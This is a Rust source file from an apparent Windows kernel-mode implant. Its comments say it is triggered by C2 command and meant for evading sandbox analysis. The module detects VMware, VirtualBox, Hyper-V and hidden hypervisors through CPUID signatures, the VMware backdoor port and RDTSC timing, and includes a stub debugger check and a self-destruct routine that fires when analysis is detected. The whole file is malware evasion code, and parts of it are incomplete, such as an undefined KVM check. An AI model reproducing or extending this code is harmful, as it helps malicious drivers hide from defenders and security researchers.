//! Anti-VM and Anti-Debug Module
//!
//! This module provides techniques to detect virtual machine environments
//! and debugger presence. Useful for evading sandbox analysis.
//!
//! Activated ONLY via C2 command.

use core::arch::asm;
use wdk_sys::{NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};

use crate::error::{ShadowError, ShadowResult};

/// Detects common hypervisor signatures via CPUID.
///
/// # Returns
/// `true` if a hypervisor is detected, `false` otherwise.
pub unsafe fn detect_hypervisor() -> ShadowResult<bool> {
    // CPUID leaf 0x1, bit 31 of ECX indicates hypervisor presence
    let mut ecx: u32;
    
    #[cfg(target_arch = "x86_64")]
    {
        asm!(
            "mov eax, 1",
            "cpuid",
            lateout("ecx") ecx,
            out("eax") _,
            out("ebx") _,
            out("edx") _,
            options(nostack, nomem)
        );
    }
    
    // Bit 31 set = hypervisor present
    Ok((ecx >> 31) & 1 == 1)
}

/// Detects VMware by checking for the "VMwareVMware" signature.
///
/// # Returns
/// `true` if VMware is detected, `false` otherwise.
pub unsafe fn detect_vmware() -> ShadowResult<bool> {
    // CPUID leaf 0x40000000 returns hypervisor vendor ID
    let mut ebx: u32;
    let mut ecx: u32;
    let mut edx: u32;

    #[cfg(target_arch = "x86_64")]
    {
        asm!(
            "mov eax, 0x40000000",
            "cpuid",
            lateout("ebx") ebx,
            lateout("ecx") ecx,
            lateout("edx") edx,
            out("eax") _,
            options(nostack, nomem)
        );
    }

    // "VMwa" = 0x61774D56, "reVM" = 0x4D566572, "ware" = 0x65726177
    // Actually: VMwareVMware -> ebx=0x61774D56, ecx=0x4D566572, edx=0x65726177
    let vmware_sig_ebx: u32 = 0x61774D56; // "VMwa" (little-endian)
    let vmware_sig_ecx: u32 = 0x4D566572; // "reVM"
    let vmware_sig_edx: u32 = 0x65726177; // "ware"

    Ok(ebx == vmware_sig_ebx && ecx == vmware_sig_ecx && edx == vmware_sig_edx)
}

/// Detects VirtualBox by checking for the "VBoxVBoxVBox" signature.
///
/// # Returns
/// `true` if VirtualBox is detected, `false` otherwise.
pub unsafe fn detect_virtualbox() -> ShadowResult<bool> {
    let mut ebx: u32;
    let mut ecx: u32;
    let mut edx: u32;

    #[cfg(target_arch = "x86_64")]
    {
        asm!(
            "mov eax, 0x40000000",
            "cpuid",
            lateout("ebx") ebx,
            lateout("ecx") ecx,
            lateout("edx") edx,
            out("eax") _,
            options(nostack, nomem)
        );
    }

    // "VBox" signature
    let vbox_sig_ebx: u32 = 0x786F4256; // "VBox"

    Ok(ebx == vbox_sig_ebx)
}

/// Detects Hyper-V by checking for the "Microsoft Hv" signature.
///
/// # Returns
/// `true` if Hyper-V is detected, `false` otherwise.
pub unsafe fn detect_hyperv() -> ShadowResult<bool> {
    let mut ebx: u32;
    let mut ecx: u32;
    let mut edx: u32;

    #[cfg(target_arch = "x86_64")]
    {
        asm!(
            "mov eax, 0x40000000",
            "cpuid",
            lateout("ebx") ebx,
            lateout("ecx") ecx,
            lateout("edx") edx,
            out("eax") _,
            options(nostack, nomem)
        );
    }

    // "Micr" "osof" "t Hv" for Hyper-V
    let hyperv_sig_ebx: u32 = 0x7263694D; // "Micr"
    let hyperv_sig_ecx: u32 = 0x666F736F; // "osof"
    let hyperv_sig_edx: u32 = 0x76482074; // "t Hv"

    Ok(ebx == hyperv_sig_ebx && ecx == hyperv_sig_ecx && edx == hyperv_sig_edx)
}

/// Detects VMware via the "Backdoor" I/O port (0x5658).
///
/// This is a more stealthy check than CPUID.
pub unsafe fn detect_vmware_port() -> bool {
    let mut eax: u32 = 0x564D5868; // 'VMXh'
    let mut ebx: u32 = 0;
    let mut ecx: u32 = 10; // Get VMware version
    let edx: u32 = 0x5658; // VMware port 'VX'

    #[cfg(target_arch = "x86_64")]
    {
        // We use a SEH-like protection in C, but here we just try and see.
        // In kernel mode, a bad I/O port read on a non-VM might BSOD if not careful.
        // However, 0x5658 is generally safe or will just fail.
        asm!(
            "in eax, dx",
            inout("eax") eax,
            lateout("ebx") ebx,
            inout("ecx") ecx,
            in("edx") edx,
            options(nostack, nomem)
        );
    }

    ebx == 0x564D5868 // 'VMXh'
}

/// Detects virtualization via RDTSC timing attack.
///
/// Hypervisors must intercept certain instructions, causing a measurable time delay.
pub unsafe fn detect_timing_attack() -> bool {
    let mut t1: u64;
    let mut t2: u64;
    let mut dummy: u32;

    #[cfg(target_arch = "x86_64")]
    {
        // 1. Measure base time
        asm!("rdtsc", "shl rdx, 32", "or rax, rdx", out("rax") t1, out("rdx") _);
        
        // 2. Execute an instruction that causes a VM exit (e.g., CPUID)
        asm!("cpuid", in("eax") 0, out("ebx") _, out("ecx") _, out("edx") _);
        
        // 3. Measure time after
        asm!("rdtsc", "shl rdx, 32", "or rax, rdx", out("rax") t2, out("rdx") _);
    }

    // A typical CPUID takes < 200 cycles on bare metal.
    // In a VM, it often takes > 1000 cycles due to VM exit/entry overhead.
    let diff = t2 - t1;
    diff > 1000
}

/// Performs a comprehensive VM detection check.
///
/// # Returns
/// A tuple of (is_vm, vm_name) where is_vm is true if any VM is detected.
pub unsafe fn comprehensive_vm_check() -> ShadowResult<(bool, &'static str)> {
    // 1. Check for hypervisor presence via CPUID bit
    if detect_hypervisor()? {
        // Check specific hypervisors
        if detect_vmware()? || detect_vmware_port() {
            return Ok((true, "VMware"));
        }
        if detect_virtualbox()? {
            return Ok((true, "VirtualBox"));
        }
        if detect_hyperv()? {
            return Ok((true, "Hyper-V"));
        }
        if detect_kvm()? {
            return Ok((true, "KVM"));
        }
        return Ok((true, "Unknown Hypervisor"));
    }

    // 2. Fallback: Timing Attack (Detects hidden hypervisors)
    if detect_timing_attack() {
        return Ok((true, "Stealth Hypervisor (Timing Attack)"));
    }

    Ok((false, "None"))
}

/// Detects kernel debugger presence via KDBG flag.
///
/// This is a placeholder - actual implementation would check
/// KdDebuggerEnabled or similar kernel variables.
///
/// # Returns
/// `true` if kernel debugger is detected, `false` otherwise.
pub unsafe fn detect_kernel_debugger() -> ShadowResult<bool> {
    // In a real implementation, we would:
    // 1. Read KdDebuggerEnabled from kernel memory
    // 2. Check KdDebuggerNotPresent
    // 3. Check for WinDbg-specific signatures
    
    // Placeholder: Always return false (no debugger)
    Ok(false)
}

/// Self-destruct function: Unloads the driver if VM/debugger is detected.
///
/// # Returns
/// `Ok(STATUS_SUCCESS)` if self-destruct was triggered.
pub unsafe fn self_destruct_if_sandboxed() -> ShadowResult<NTSTATUS> {
    let (is_vm, vm_name) = comprehensive_vm_check()?;
    let is_debugged = detect_kernel_debugger()?;

    if is_vm || is_debugged {
        // TODO: Implement driver self-unload logic
        // For now, return an error to indicate sandbox detection
        return Err(ShadowError::ApiCallFailed(
            if is_vm { "VM Detected" } else { "Debugger Detected" },
            STATUS_UNSUCCESSFUL as i32,
        ));
    }

    Ok(STATUS_SUCCESS)
}
